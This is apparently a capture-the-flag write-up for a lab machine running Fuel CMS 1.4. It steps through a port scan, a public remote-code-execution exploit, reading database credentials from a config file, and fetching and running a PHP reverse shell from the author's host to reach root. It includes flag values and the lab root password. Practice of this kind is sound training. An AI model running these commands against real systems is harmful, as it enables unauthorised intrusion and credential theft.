# Brooklyn Nine Nine

--------------------------------------------------------------------

**TOOLS USED**: nmap, dirb, exploitdb

--------------------------------------------------------------------

## GIVEN INFO


**IP Address**: 10.10.156.75

--------------------------------------------------------------------

## PROCEDURE

### 1. RECON

Run port scan
```
nmap -sC -sV 10.10.156.75
```

![1.1](./imgs/1.1.png)

```
dirb http://10.10.156.75
```

![1.2](./imgs/1.2.png)

Website running Fuel CMS Version 1.4<br>

![1.4](./imgs/1.4.png)

![1.3](./imgs/1.3.png)

**USER**: admin<br>
**PASSWORD**: admin<br>

### 2. EXPLOIT

Search for exploit
```
searchsploit fuel cms
```

![2.1](./imgs/2.1.png)

-m copy exploit to current directory
```
searchsploit -m php/webapps/50477.py
python3 50477.py -u http://10.10.156.75
```

![2.2](./imgs/2.2.png)

![2.3](./imgs/2.3.png)

**USER FLAG**: 6470e394cbf6dab6a91682cc8585059b

### 3. PRIVILEGE ESCALATION

![3.1](./imgs/3.1.png)

Database file located at fuel/application/config/database.php
```
cat fuel/application/config/database.php
```

![3.2](./imgs/3.2.png)

**ROOT PASSWORD**: mememe

Need a proper shell to become root user

Get php reverse shell from pentest monkey and edit IP

![3.3](./imgs/3.3.png)

Start python server
```
python -m http.server
```

Get exploit from host machine
```
wget http://10.6.40.234:8000/exploit.php
```

Start listener for reverse shell
```
nc -lnvp 1234
```

Run reverse shell
```
php exploit.php
```

Spawn interactive shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

![3.4](./imgs/3.4.png)

Now we can switch to the root user

```
su root
cat /root/root.txt
```

![3.5](./imgs/3.5.png)

**ROOT FLAG**: b9bbcb33e11b80be759c4e844862482d


